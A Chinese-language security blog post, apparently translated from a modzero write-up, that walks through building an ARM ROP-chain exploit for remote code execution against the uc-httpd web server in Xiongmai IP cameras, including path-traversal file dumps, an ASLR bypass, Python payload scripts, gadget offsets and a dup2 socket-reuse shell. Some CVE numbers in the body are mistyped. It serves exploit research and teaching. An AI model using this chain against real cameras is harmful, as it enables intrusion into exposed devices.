#  通过ROP实现RCE的一次技术探索之旅   
山石网科  山石网科安全技术研究院   2025-02-25 17:21  
  
![图片](https://mmbiz.qpic.cn/mmbiz_gif/NGIAw2Z6vnKvXxzN9syadS6NM2YvjAFg2NBLDqDGZVP1U0V8gHOVwgkjJ2wpWTDz4YRA2t8rlEWdxNWIhnnhpA/640?wx_fmt=gif&wxfrom=5&wx_lazy=1&tp=webp "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8Jb8ZACqDjPdMzgicp2SzdZ19mFnVcBO53s1uA2cSfarQkwibVUeCeH9w/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
****  
****  
******ROP实现RCE：这不是魔法，这是技术的魅力！******  
  
****  
****  
![图片](https://mmbiz.qpic.cn/mmbiz_jpg/NGIAw2Z6vnLKuKAwMiaYedpTAYugKibaTBsHzf5pDuztECgfIgOfpG5DRF31jzhosMEj23dlx186q0zgLaIZj9lA/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
  
  
在网络安全领域，远程代码执行（RCE）一直是攻击者和防御者关注的焦点。  
今天，为大家带来一篇深度文章[1]，它将引领我们深入探讨如何通过ROP（Return-Oriented Programming）实现RCE。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**一、前言**  
  
  
  
在红队演练中，仅仅发现一个XSS漏洞或基本配置错误通常是不够的，真正的目标是实现远程代码执行(RCE)。在一次这样的评估中，我们遇到了雄迈(厂商)的uc-httpd，这是一个轻量级的Web服务器，被全球无数的IP摄像头使用。根据Shodan的数据，大约有7万个该软件的实例在互联网上公开暴露。虽然该软件历史上存在严重漏洞，但没有现成的Exp能够实现代码执行，因此我决定自己开发一个。最初的计划是针对CVE-2018-100881[2]，这是一个缓冲区溢出漏洞，现有的Exp[3]只能使服务器崩溃，但无法实现RCE。但正如大多数探索之旅一样，很少有直通终点的路径，更多时候需要灵活应对。于是，在这个过程中，我发现了新的路径，学习了ARM架构的知识，并构建了一个ROP链。这个ROP链通过Web请求传递，并巧妙地重用了相同的连接作为Shell。毕竟，谁还需要反向Shell呢？不过，让我们从故事的开头讲起  
。  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**二、分析**  
  
  
在尝试利用漏洞之前，我们需要先理解漏洞的原理。因此，首先我需要获取uc-httpd的源代码或编译后的二进制文件。不出所料，该软件并不开源。但幸运的是，存在一个非常简单的路径遍历漏洞—CVE-2017-75773[4]，允许从受影响的uc-httpd服务器下载任意文件。通过访问/proc/self/exe，可以下载当前正在运行的可执行文件（通常名为Sofia）进行分析。我使用file和checksec[5]对目标二进制文件进行了常规检查。如下所示，这是一个ARM32位动态链接的可执行文件  
。  
  
```
$ file Sofia
Sofia: ELF 32-bit LSB executable, ARM, EABI5 version 1 (SYSV), dynamically 
linked, interpreter /lib/ld-uClibc.so.0, stripped 

```  
  
  
```
$ checksec --file=Sofia
RELRO           STACK CANARY     NX           PIE
No RELRO       No canary found   NX disabled   No PIE

```  
  
  
没有重定位只读(RELRO)保护，这意味着全局偏移表(GOT)是可写的；没有栈保护机制（stackcanary）来检测栈溢出；不可执行（NX）保护也被禁用，允许在栈上执行shellcode。此外，由于它不是位置无关可执行文件（PIE），该二进制文件总是被加载到一个固定的内存地址。  
  
  
我启动Ghidra来反编译二进制文件并探索其内部工作原理。通过触发漏洞并查看日志输出的字符串的交叉引用，我能够精确定位一个似乎充当HTTP调度者的函数（关于具体的调试环境，稍后会详细介绍）。  
‍  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjKDddQ7bAsdnp3aOuPN307y1IJwJgAZKjapa5uSkPT5kz9ecT5iacg4A/640?wx_fmt=png&from=appmsg "")  
  
  
在这个函数中，CVE-2018-10088[2]很容易被发现。常见的可疑函数strcpy被用来将http请求体中的用户名和密码参数复制到某些数据段中。  
  
```
substring = strtok((char *)0x0,"&")；
strcpy(&DATA_USERNAME,substring + 9)；
substring = strtok((char *)0x0,"&")；
strcpy(&DATA_PASSWORD,substring + 9)；

```  
  
  
通过检查这些数据段，我发现这些缓冲区的长度均为20字节。因此，超过20个字符的用户名和密码会导致相应的缓冲区溢出。我还发现这些缓冲区位于二进制文件的.bss数据段中，这对于劫持程序执行流来说显然不是理想的情况。不过，我注意到在该段的下方有一些函数指针，通过溢出覆盖这些指针，理论上可以重定向程序执行流。  
  
‍  
  
然而，在浏览了调度器函数的其余部分后，我发现了另一个漏洞（后来我才知道这是CVE-2022-45460），这个漏洞似乎更符合我的目标。让我们来看看它。  
‍  
  
```
iVar1 = strcmp((char *)__s1,".lang")；
if (iVar1 == 0) {
    sprintf(filepath,"%s/%s","/mnt/custom",&DAT_FILEPATH)；
}
else {
    substring = strstr((char *)uri,"mns.cab")；
    if (substring == (char *)0x0) {
        strstr((char *)uri,"logo/")；
 sprintf(filepath,"%s/%s")；
   }
    else {
        sprintf(filepath,"%s/%s","/usr/mobile",uri)；
   }
}
iVar1 = stat(filepath,&stat_struct)；
if (iVar1 != 0) {
    if ((filepath[0] != '\0') && (iVar1 = atoi(filepath), 0 < iVar1)) {
        DAT_006e9324 = iVar1；
        sprintf((char *)&uStack_68,".%s","/index.htm")；
        FUN_003376cc(socket_stream,&uStack_68,0)；
        return 0；
   }
    write_response_header(socket_stream,0x68)；
    fwrite("<html><head><title>404 File Not Found</title></head>\n",1,0x35,socket_stream)；
    fwrite("<body>The requested URL was not found on this server</body></html>\n",1,0x43,socket_stream)；
    return 0；
} 
```  
  
  
这段代码中，URI和文件路径使用sprintf进行拼接，且没有任何边界检查。特别有趣的是，当用户控制的URI与字符串/usr/mobile拼接时，会发生溢出。在这种情况下，溢出发生在我称为filepath的栈变量上。栈溢出非常强大，因为通常函数的返回地址存储在栈上，这使得在溢出期间可以覆盖这些地址并重定向程序的执行流。由于没有栈保护机制（stackcanary）的阻碍，因此这个漏洞应该相对容易利用。  
  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**三、调试环境**  
  
  
在深入研究漏洞之前，我希望建立一个专门的测试环境用于调试。我的目标是避免依赖任何硬件设备。由于没有任何现有Exp，我无法访问设备来部署调试器。  
  
  
‍  
  
因此，我首先利用之前提到的路径遍历漏洞（CVE-2017-75773）来转储文件系统。然后，我尝试使用chroot和QEMU的ARM系统模拟器[6]来构建一个完全虚拟化的环境。这种方法在一段时间内运行良好，但最终表现出一些看似奇怪的行为，特别是在内存地址方面。  
  
‍  
  
我手头还有一个闲置的树莓派，于是决定尝试用它来搭建环境。我将获取到的rootfs复制到树莓派上，并下载了静态编译的gdbserver[7]和bash（gdb所需）二进制文件。接着，我在树莓派上的chroot环境中启动了gdbserver。  
  
```
$ sudo mount --bind /proc/ rootfs/proc
mount: (hint) your fstab has been modified, but systemd still uses
       the old version；use 'systemctl daemon-reload' to reload.
pwn@raspberrypi:~ $ sudo chroot rootfs/ sh
# ls
bin       dev       gdbserver linuxrc   proc       tmp       utils
boot       etc       lib       mnt       sbin       usr       var
# ./gdbserver :8888 Sofia
Process Sofia created；pid = 911
Listening on port 8888
Remote debugging from host 192.168.2.1, port 64996 

```  
  
  
然后，我使用gdb-multiarch从我的机器连接到树莓派上的gdbserver。  
  
```
$ gdb-multiarch
GNU gdb (Debian 15.2-1+b1) 15.2
Copyright (C) 2024 Free Software Foundation, Inc.
(...)
gef➤ gef-remote 192.168.2.2 8888

```  
  
  
因此，最终的调试环境大致如下[8][9]：  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKj7TRty2nqLQkvuZo7dc040cQUmNXXdibcRnCU1Lgvegvd0zdu1lx53UQ/640?wx_fmt=png&from=appmsg "")  
  
  
这种配置允许在攻击者的机器上使用GEF[10]来设置断点并远程调试树莓派上的目标程序，非常完美。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**四、触发漏洞**  
  
****  
在完成上述调试环境配置后，可以首次尝试触发已识别的漏洞。这个过程与任何此类二进制漏洞利用(Pwn)挑战并无不同。为了控制程序执行流，我们首先需要确定输入在栈上的哪个位置覆盖了特定偏移量，最终该偏移量会被pop到指令计数器PC中。通过发送独特的字符序列并观察程序崩溃时PC寄存器中的字节，我们可以精确地找到偏移量。唯一需要注意的是，URI必须以.mns.cab结尾，以确保命中正确的代码路径。  
  
```
import sys
import socket
payload = b""
payload += 304 * b"A" + b"BBBB"
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
    sock.connect((sys.argv[1], int(sys.argv[2])))
    sock.send(b"GET /" + payload + b".mns.cab HTTP/1.1")
    sock.send(b"\r\n\r\n")
print(sock.recv(1024))

```  
  
  
为了观察服务器端的情况，我在漏洞代码段之后的返回语句处（即第二次调用fwrite之后）设置了一个断点。如下图所示，寄存器r4到r10依次从栈中弹出，随后是PC寄存器。使用上述Python脚本，这些寄存器被填充为字符A，而PC寄存器被设置为BBBB，这标志着控制流劫持的入口点。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjGzEbSQZib1iafibQ2lstcgoqqg7guj6gZ4t4yDa6PU4ctv1HgtcU1hgew/640?wx_fmt=png&from=appmsg "")  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**五、构造Exp**  
  
  
这里有件事需要说明一下。尽管NX保护被禁用，理论上栈应该是可执行的，但我对此并不十分确定。在我的树莓派设置中，栈始终被标记为rw，而不是rwx。尝试从栈上执行shellcode失败了。因此，我（错误地）认为在真实设备上也会是同样的情况。我没有过多思考这个问题，而是继续按照计划构建ROP链。ROP（Return-OrientedProgramming，面向返回编程）是一种漏洞利用技术，攻击者利用程序中已经存在的小段代码片段（称为gadgets）。通过将这些gadgets链接在一起，攻击者可以执行任意代码，而无需注入新的代码。此外，尽管Sofia二进制文件本身禁用了PIE，但其包含的库启用了PIE，因此我也假设ASLR是启用的。这意味着在构建ROP链时需要绕过ASLR，以便使用来自库（如libc）的gadgets。另一个需要注意的重要问题是，由于我们使用sprintf进行溢出，因此payload不能包含空字节\x00，否则会被截断。此外，在进一步检查反编译的代码段后，我发现空格也会被去除  
。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**六、ASLR绕过**  
  
  
由于Sofia二进制文件未启用PIE，即使启用了ASLR，它也会始终加载到相同的内存区域。然而，由于二进制文件映射到的地址区域仅覆盖地址空间的低3字节，因此每个地址的最高有效字节都包含一个空字节\x00。这意味着，至少在ROP链的入口点，无法使用Sofia二进制文件本身的gadgets。因此，我将注意力转向了包含的libc库，但由于libc编译时是开启PIE的，绕过ASLR变得至关重要。你可能已经猜到，我们的路径遍历漏洞再次派上了用场，这次是为了绕过ASLR。其实并没有什么神奇之处，只是通过转储/proc/self/maps来获取Sofia进程的内存映射，从而确定所有包含库的基地址。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**七、ARM架构**  
  
  
由于构建ROP链需要对底层架构有一定的了解，我们需要先介绍一些关于ARM架构的基本概念。如果你已经熟悉这些内容，可以跳过这部分。ARM是一种精简指令集(RISC)架构，这意味着它使用少量的简单指令，而不是像x86那样大量的复杂指令。它广泛应用于移动设备和嵌入式系统中。ARM的一个独特之处是Thumb指令集。Thumb是最常用的32位ARM指令的子集，每条指令只有16位长。这些指令与其32位对应指令具有相同的效果，但允许生成更紧凑、更高效的代码。ARM处理器可以在执行过程中在ARM模式和Thumb模式之间切换[11]。对于ROP链来说，ARM的调用约定[12]尤为重要，因为它规定了函数参数的传递方式以及控制流的管理方式。ARM有16个通用寄存器，从R0到R15。寄存器R0-R3用于传递前四个函数参数，如果函数有超过四个参数，其余的参数会被放置在栈上。R4-R11用于存储函数内的局部变量。函数的返回值存储在R0-R3中。在ARM中，跳转指令主要有四种类型：B、BL、BX和BLX。这些指令控制程序流，并在保存返回地址或切换ARM和Thumb模式的能力上有所不同。下表总结了它们的特性[13]：  
  
<table><thead><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><th style="border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);">指令</th><th style="border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);">功能</th><th style="border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);">保存返回地址 (LR)</th><th style="border-color: rgb(204, 204, 204);text-align: left;background-color: rgb(240, 240, 240);">能否切换指令集</th></tr></thead><tbody style="border-width: 0px;border-style: initial;border-color: initial;"><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);">B</td><td style="border-color: rgb(204, 204, 204);">Simple branch</td><td style="border-color: rgb(204, 204, 204);">No</td><td style="border-color: rgb(204, 204, 204);">No</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);">BL</td><td style="border-color: rgb(204, 204, 204);">Branch with Link</td><td style="border-color: rgb(204, 204, 204);">Yes</td><td style="border-color: rgb(204, 204, 204);">No</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: white;"><td style="border-color: rgb(204, 204, 204);">BX</td><td style="border-color: rgb(204, 204, 204);">Branch and exchange instruction set</td><td style="border-color: rgb(204, 204, 204);">No</td><td style="border-color: rgb(204, 204, 204);">Yes (depending on destination)</td></tr><tr style="border-width: 1px 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(204, 204, 204);background-color: rgb(248, 248, 248);"><td style="border-color: rgb(204, 204, 204);">BLX</td><td style="border-color: rgb(204, 204, 204);">Branch with Link and exchange instruction set</td><td style="border-color: rgb(204, 204, 204);">Yes</td><td style="border-color: rgb(204, 204, 204);">Yes (depending on destination)</td></tr></tbody></table>  
  
当返回地址被保存时，意味着分支或函数调用后的下一条指令地址被存储在链接寄存器（LR）中。这使得程序在分支或函数调用完成后可以返回到该点。正如我们稍后将看到的，这反映在函数的起始和结尾。在函数的起始，LR寄存器通常被推送到堆栈以保存返回地址；而在结尾，它被弹回到PC以确保程序跳回到调用函数。  
  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**八、寻找Gadgets**  
  
  
让我们来谈谈如何构建ROP链。归根结底，这个过程就是找到能够协同工作以实现特定目标的有用gadgets。在我的第一次尝试中，我计划构造一个执行system("/bin/sh")的ROP链。为了实现这一点，我需要一些gadgets，这些gadgets能够将栈指针移动到R0（因为R0是传递第一个参数的位置），然后跳转到加载的libc中的system函数。这样，我就可以利用栈来放置我想要执行的命令。为了找到这些gadgets，广泛使用的工具Ropper[14]非常方便。它专门用于从二进制文件中识别和提取ROPgadgets。  
‍  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjTqTaKuLGADJicCcjSKjibAYTZLUJFSHdbD4B4D9Nw5lK9wblpZRacLHQ/640?wx_fmt=png&from=appmsg "")  
  
  
经过一段时间的搜索，我找到了以下解决方案：  
‍  
  
```
0x000175cc: pop {r3, pc}
0x000535e8: system
0x000368dc: mov r0, sp；blx r3

```  
  
  
第一个gadget将R3设置为一个可控的值，并跳转到下一个地址。第二个gadget（movr0,sp；blxr3）将栈指针移动到R0（system函数的第一个参数），并跳转到R3，而R3之前被设置为system函数的地址。  
  
  
函数地址（例如system的地址）可以通过readelf-s来确定。但需要注意的是，我们需要将相应二进制文件或库的基地址添加到输出中看到的偏移量中。这确保了在构建ROP链时使用的是正确的地址  
。  
‍  
  
```
$ readelf -s libc.so.0 | grep system
   659: 0003dfc0    80 FUNC   GLOBAL DEFAULT    7 svcerr_systemerr
   853: 000535e8   116 FUNC   WEAK   DEFAULT    7 system
   864: 000535e8   116 FUNC   GLOBAL DEFAULT    7 __libc_system 

```  
  
  
正如我们之前所了解的，payload不能包含任何空格。然而，我发现这可以通过众所周知的${IFS}技巧[15]轻松绕过。  
  
  
将所有内容整合在一起，我最终构建了一个大致如下的漏洞利用程序（完整源代码可在此处获取）：  
  
```
def main():
    maps = fetch_maps()
    libc, libc_base = parse_maps(maps)
    payload = b""
    payload += 304 * b"A"
    payload += pack("<I", libc_base + GADGETS[libc][0]) # pop {r3, pc}
    payload += pack("<I", libc_base + GADGETS[libc][1]) # system
    payload += pack("<I", libc_base + GADGETS[libc][2]) # mov r0, sp；blx r3
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.connect((HOST, PORT))
        sock.send(b"GET /" + payload + CMD.replace(b" ", b"${IFS}") + 
b"；.mns.cab HTTP/1.1")
        sock.send(b"\r\n\r\n")
    
        print(sock.recv(1024)

```  
  
  
由于  
在没有远程交互方式的情况下，/bin/sh命令并不是非常有用，因此我使用telnetd在目标的1337端口上启动了一个telnet服务器。这使我能够连接并获取一个shell。  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKj0TDRE3czBKePic02OSXHkIe2HM5cY7Km7lwkZ5q1UUzMSiaGXDkj4W5w/640?wx_fmt=png&from=appmsg "")  
  
  
是的，RCE！  
但自从分析了反编译的调度器函数后，另一种可能的解决方案一直萦绕在我的脑海中。  
我一直在想，这是否真的可行。  
是时候去验证一下了——接下来进入第二部分。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**九、更进一步**  
  
  
让我们稍微回顾一下，由于缓冲区溢出而导致控制流转移到我们选择的位置的代码部分。我们可以看到，在返回语句之前不久，有两个fwrite调用将响应写入到与发送原始请求的客户端连接的socket_stream中。这使我得出以下两个假设：  
  
- 当ROP链被触发时，连接尚未关闭。  
  
- 某个寄存器中很可能仍存放着对socket_stream的引用。  
  
  
  
```
write_response_header(socket_stream,0x68)；
    fwrite("<html><head><title>404 File Not Found</title></head>\n",1,0x35,socket_stream)；
    fwrite("<body>The requested URL was not found on this server</body></html>\n",1,0x43,socket_stream)；
    return 0；
} 

```  
  
  
这让我想起了CTF挑战，其中易受攻击的二进制文件通过套接字暴露，通常使用socat。在这些情况下，编写shellcode实现RCE的常用方法如下[16]：  
  
```
fd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)； // create socket
connect(fd, (struct sockaddr *) &serv_addr, 16)； // connect
dup2(fd, 0)； // dup socket and STDIN
dup2(fd, 1)； // dup socket and STDOUT
dup2(fd, 2)； // dup socket and STDERR
execve("/bin/sh", 0, 0)； // execute /bin/sh

```  
  
  
socket()函数使用指定的域（domain）、类型（type）和协议（protocol）创建一个新的套接字。然后，connect()建立与目标地址的连接。连接成功后，dup2()被调用三次，将套接字文件描述符重定向到标准输入（STDIN）、标准输出（STDOUT）和标准错误（STDERR），从而将shell的I/O绑定到套接字上。最后，execve()执行/bin/sh，生成一个通过已建立连接进行通信的shell。  
  
  
在上述情况下，我已经完成了这一策略的一半。我已经有了一个套接字/连接，所以剩下的就是调用dup2和system，对吧？这将允许我重用已经建立的连接作为shell。  
  
我有一个FILE*stream，但是dup2需要的是整数形式的文件描述符。所以还需要一个额外的步骤-调用fileno()来获取相应的文件描述符。因此，这个计划大致如下：  
  
```
fd = fileno(stream)
dup2(fd, 0)
dup2(fd, 1)
dup2(fd, 2)
system("/bin/sh")

```  
  
  
然  
而，在开始构建ROP链之前，我想验证我之前做出的假设。为此，我在第二个fwrite调用之前设置了一个断点，并在return语句处设置了另一个断点。当命中第一个断点时，socket_stream的引用应该位于R3（fwrite的第四个参数）中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKj7xJhhicLavaUy9yCBx7Vz3euHy37aN1wfjJnW0iaUTel5H9Y2KvbB4xg/640?wx_fmt=png&from=appmsg "")  
  
  
在第二个断点处，我们可以看到相同的值仍然在R3中，这证实了在ROP链被触发时，我们确实有一个可用的socket_stream引用。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjhtibicSptwPz1NtW4NkWicGLrkZVszV7lkyJoY1UYhoETU0rTTeQ1CA2A/640?wx_fmt=png&from=appmsg "")  
  
  
在  
这个过程中，我还注意到，触发断点的curl命令在程序停止时并未返回。这意味着连接仍然处于打开状态。好消息是，之前的假设似乎成立。下一步是构建ROP链。我继续寻找能够将参数移动到正确寄存器并调用之前概述的函数的gadgets。我假设每个被调用的函数都会通过pop{pc}返回，因此我不需要担心gadgets和函数调用的链接问题。然而，我错了，至少部分错了。虽然pop{pc}的假设是正确的，但我仍然无法简单地链接这些函数调用。为什么呢？因为我忘记了函数的初始化。例如，在fileno函数的初始化中，我们可以看到寄存器R4-R8被压入栈中。这是为了确保在函数返回时可以恢复这些寄存器（被调用者保存的寄存器）。但我们还可以看到，链接寄存器（LR）也被压入栈中。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjLR0KnsOZ630ygg2rZk3siaySJ445AG3SNGfs4YsfHCgThGX8wQLOuHg/640?wx_fmt=png&from=appmsg "")  
  
  
结合之前讨论的不同跳转指令的知识，这也完全说得通。函数是通过bl指令调用的，该指令将LR设置为跳转后紧接着的指令地址。这确保了在函数退出时，我们能够返回到正确的位置。  
  
‍  
  
然而，对于我构建ROP链的目标来说，这听起来像是个坏消息，因为我无法真正控制LR寄存器。我继续寻找允许我在跳转到函数之前设置LR的gadgets。尽管解决方案对你来说可能显而易见，但我花了一整晚的睡眠时间才最终意识到，我们可以直接跳过函数初始化。这样一来，我根本不需要担心LR中的值。因此，我简单地为每个函数符号添加了+0x4。问题解决了。  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjBoRgFR4HmURNfRLtjrpIJsBgiaOf6iaKcPzxWJo7bSGNqK9pqkOxwTlw/640?wx_fmt=png&from=appmsg "")  
  
  
唯一的要求是在栈上添加一些填充，以应对函数末尾。对于fileno来说，这意味着总共需要5x8字节的填充。这实际上非常有用，因为它允许我将这些寄存器设置为任意值。我继续将这些部分拼凑在一起。按照之前的计划，我从调用fileno开始。  
  
```
p = b""
p += p32(libc_base + 0xf964) # mov r0, r3；pop {r4, pc}
p += b"XXXX" # r4 padding
p += p32(libc_base + 0x3102c + 0x4) # fileno

```  
  
  
第  
一个gadget将socket_stream的引用移动到R0中，以确保它作为参数传递给fileno。调用之后，添加了一些填充以正确处理函数的末尾。ldmia指令可以看作是我们之前看到的pop的等价操作。寄存器R5稍后会被使用，因此我提前将dup2的地址存储在其中。  
  
```
# fileno末尾: ldmia sp!,{r4,r5,r6,r7,r8,pc}
p += b"XXXX" # r4 padding
p += p32(libc_base + 0xce5c + 0x4) # r5 -> dup2
p += b"XXXX" # r6 padding
p += b"XXXX" # r7 padding
p += b"XXXX" # r8 padding 

```  
  
  
接下来是调用dup2。为了实现目标，需要为STDIN、STDOUT和STDERR分别调用该函数三次。对于所有三次调用，R0应始终设置为通过fileno检索到的文件描述符，而R1则从0开始，然后是1，最后是2。第一次调用可以不设置，因为R1已经设置为0。  
  
```
p += p32(libc_base + 0xce5c + 0x4) # dup2, r1 = 0
# dup2 epilogue: ldmia sp!,{r7,pc}
p += b"XXXX" # r7 padding 

```  
  
  
对于第二次调用，我找到了一个gadget，它在跳转到R5中的地址之前将1移动到R1中，而R5中已经存储了dup2的地址。  
‍  
  
```
p += p32(libc_base + 0x1cdcc) # mov r1, #1；mov r2, r6；blx r5
# dup2 epilogue: ldmia sp!,{r7,pc}
p += b"XXXX" # r7

```  
  
  
不幸的是，我找不到一个可行的gadget来实现第三次调用。因此，这留给读者作为练习。现在，剩下的就是重用第一个简单漏洞利用中的链来生成一个shell。  
‍  
  
```
p += p32(libc_base + 0x175cc) # pop {r3, pc}；
p += p32(libc_base + 0x535e8) # system
p += p32(libc_base + 0x368dc) # mov r0, sp；blx r3

```  
  
  
至此，终于到了测试的时候了。  
‍  
  
  
![](https://mmbiz.qpic.cn/mmbiz_png/Gw8FuwXLJnSWGjiaxicD2QJYKeDNqbShKjIUX7jNoLCib7ZHFOicnIGd3O7rogCOy0iaicOsPU2lPJpGr4LQUdQY78cw/640?wx_fmt=png&from=appmsg "")  
  
  
成功了！比第一次尝试的解决方案优雅得多。无需启动telnetd服务器或建立反向shell！最终的漏洞源代码可以在这里找到。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**十、总结**  
  
  
正  
如在过程中提到的，我在开发Exp后才发现，这里讨论的漏洞已经被识别并跟踪为CVE-2022-45460[17]。此外，已经存在一个利用栈上shellcode实现RCE的Exp[18]。显然，我最初对产品的研究并不够彻底。尽管如此，我在探索利用该漏洞的替代方法中获得了许多乐趣，并在此过程中学到了很多。鉴于公开漏洞利用程序的存在，我们觉得发布我的完整漏洞利用程序是合适的，尽管在其他情况下我们通常会避免这样做  
。  
  
  
![图片](https://mmbiz.qpic.cn/mmbiz_png/NGIAw2Z6vnLSsTccx7j0fJVU0OOoqKA8lvpAJHElQA6DiaJniaZb0daO3Kppz9ndV9Z2hHsjMuH61r2hu0jesGSg/640?wx_fmt=other&wxfrom=5&wx_lazy=1&wx_co=1&tp=webp "")  
  
**参考文献**  
  
  
[1]  
https://modzero.com/en/blog/roping-our-way-to-rce  
  
[2]CVE-2018-10088 -   
https://nvd.nist.gov/vuln/detail/CVE-2018-10088  
   
  
[3]Exploit for CVE-2018-10088 -   
https://www.exploit-db.com/exploits/44864  
   
  
[4]CVE-2017-7577 -   
https://nvd.nist.gov/vuln/detail/CVE-2017-7577  
   
  
[5]Checksec -   
https://github.com/slimm609/checksec  
   
  
[6]Arm System emulator -   
https://www.qemu.org/docs/master/system/target-arm.html  
   
  
[7]GDB Static -   
https://github.com/guyush1/gdb-static  
   
  
[8]Laptop Vectors by Vecteezy -   
https://www.vecteezy.com/free-vector/laptop  
   
  
[9]Raspberry Pi Vector Png -   
https://www.raspberrylovers.com/1995/06/raspberry-pi-vector-png.h   
  
[10]GEF (GDB Enhanced Features) -   
https://github.com/hugsy/gef  
   
  
[11]The Thumb instruction set -   
https://developer.arm.com/documentation/ddi0210/c/CACBCAAE  
   
  
[12]ARM calling convetion -   
